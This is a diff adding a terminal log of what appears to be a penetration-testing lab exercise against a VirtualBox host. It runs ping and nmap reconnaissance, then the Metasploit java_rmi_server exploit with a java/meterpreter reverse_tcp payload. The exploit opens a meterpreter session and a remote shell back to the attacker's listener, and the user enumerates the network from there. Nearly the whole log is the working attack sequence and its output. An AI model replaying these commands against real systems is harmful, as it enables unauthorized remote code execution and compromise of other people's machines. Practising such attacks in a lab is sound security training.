@@ -1,0 +1,221 @@
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ ping 192.168.50.155                                                                                                         1: ~
+
+PING 192.168.50.155 (192.168.50.155) 56(84) bytes of data.
+64 bytes from 192.168.50.155: icmp_seq=1 ttl=64 time=0.504 ms
+64 bytes from 192.168.50.155: icmp_seq=2 ttl=64 time=0.888 ms
+64 bytes from 192.168.50.155: icmp_seq=3 ttl=64 time=0.702 ms
+64 bytes from 192.168.50.155: icmp_seq=4 ttl=64 time=2.42 ms
+^C
+--- 192.168.50.155 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3031ms
+rtt min/avg/max/mdev = 0.504/1.127/2.417/0.756 ms
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ msfconsole                                                                                                                  1: ~
+
+Metasploit tip: View advanced module options with advanced
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v6.4.20-dev                          ]
++ -- --=[ 2440 exploits - 1256 auxiliary - 429 post       ]
++ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > nmap -O -sV -p 1099 192.168.50.155
+[*] exec: nmap -O -sV -p 1099 192.168.50.155
+
+TCP/IP fingerprinting (for OS scan) requires root privileges.
+QUITTING!
+msf6 > sudo nmap -O -sV -p 1099 192.168.50.155
+[*] exec: sudo nmap -O -sV -p 1099 192.168.50.155
+
+[sudo] password di sushanto: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 13:52 CEST
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Nmap scan report for 192.168.50.155
+Host is up (0.00042s latency).
+
+PORT     STATE SERVICE  VERSION
+1099/tcp open  java-rmi GNU Classpath grmiregistry
+MAC Address: 08:00:27:C5:97:8C (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
+msf6 > search java_rmi
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  auxiliary/gather/java_rmi_registry              .                normal     No     Java RMI Registry Interfaces Enumeration
+   1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
+   2    \_ target: Generic (Java Payload)             .                .          .      .
+   3    \_ target: Windows x86 (Native Payload)       .                .          .      .
+   4    \_ target: Linux x86 (Native Payload)         .                .          .      .
+   5    \_ target: Mac OS X PPC (Native Payload)      .                .          .      .
+   6    \_ target: Mac OS X x86 (Native Payload)      .                .          .      .
+   7  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner
+   8  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/multi/browser/java_rmi_connection_impl
+
+msf6 > use 1
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
+                                         asploit.html
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local mac
+                                         hine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/java_rmi_server) > set rhost 192.168.50.155
+rhost => 192.168.50.155
+msf6 exploit(multi/misc/java_rmi_server) > set lhost 192.168.50.172
+lhost => 192.168.50.172
+msf6 exploit(multi/misc/java_rmi_server) > options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOSTS     192.168.50.155   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
+                                         asploit.html
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local mac
+                                         hine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.50.172   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/java_rmi_server) > set PAYLOAD java/meterpreter/reverse_tcp
+PAYLOAD => java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > run
+
+[*] Started reverse TCP handler on 192.168.50.172:4444 
+[*] 192.168.50.155:1099 - Using URL: http://192.168.50.172:8080/kmHi3Y1
+[*] 192.168.50.155:1099 - Server started.
+[*] 192.168.50.155:1099 - Sending RMI Header...
+[*] 192.168.50.155:1099 - Sending RMI Call...
+[*] 192.168.50.155:1099 - Replied to request for payload JAR
+[*] Sending stage (57971 bytes) to 192.168.50.155
+[*] Meterpreter session 1 opened (192.168.50.172:4444 -> 192.168.50.155:58324) at 2024-09-27 13:57:26 +0200
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo - lo
+Hardware MAC : 00:00:00:00:00:00
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ::
+
+
+Interface  2
+============
+Name         : eth0 - eth0
+Hardware MAC : 00:00:00:00:00:00
+IPv4 Address : 192.168.50.155
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a00:27ff:fec5:978c
+IPv6 Netmask : ::
+
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+192.168.50.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0
+0.0.0.0         192.168.50.1    0.0.0.0         UG    100    0        0 eth0
+
